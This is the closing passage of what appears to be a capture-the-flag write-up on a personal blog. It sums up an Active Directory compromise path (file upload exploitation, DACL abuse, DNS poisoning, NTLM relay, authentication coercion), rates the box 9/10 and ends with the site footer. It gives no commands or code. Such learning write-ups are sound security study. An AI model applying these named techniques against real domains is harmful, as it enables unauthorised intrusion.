together. A single weak link‚Äîlike a crackable service account password or excessive DACL permissions‚Äîcan provide attackers with the foothold they need to completely compromise a domain.</aside><p>The escalation path involving DNS poisoning, NTLM relay, and authentication coercion represents cutting-edge attack techniques that defenders must understand and mitigate. Organizations still relying on NTLM authentication are playing with fire.</p><aside>üèÜ **Box Rating:** 9/10
Excellent learning experience covering file upload exploitation, Active Directory abuse, and advanced relay attacks. Highly recommended for understanding modern Windows domain security.</aside><p><em>Happy Hacking! üéØ</em></p></span></article></div></main></div><footer><div class="flex flex-col justify-center p-10"><p class="text-center text-slate-700 dark:text-slate-400">&copy;
2025
Richie-Havoc</p><p class="text-center text-sm text-slate-700 dark:text-slate-400">Powered by <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://gohugo.io target=_blank rel="noopener noreferrer">Hugo</a> & <a class="hover:underline hover:decoration-indigo-500 hover:text-indigo-500" href=https://github.com/chrede88/qubt target=_blank rel="noopener noreferrer">Qubt</a></p></div></footer></body></html>